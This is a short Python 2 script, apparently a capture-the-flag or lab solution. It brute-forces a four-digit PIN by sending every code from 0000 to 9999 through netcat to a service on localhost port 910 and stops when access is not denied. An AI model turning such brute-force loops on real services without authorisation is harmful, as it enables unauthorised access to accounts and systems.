#!/bin/python2
import os
import time

COMMAND = "echo {} | nc localhost 910"

for i in range(0,10000):
    #word = "{}{}{}{}".format(i/10/10/10%10,i/10/10%10,i/10%10,i%10)
    word = str(i).zfill(4)
    result = os.popen(COMMAND.format(word)).read()
    print("[*] Trying with : {}".format(word))
    if "Access denied, disconnecting client"  not in result:
        print("[+] Found: {} !".format(word))
        break
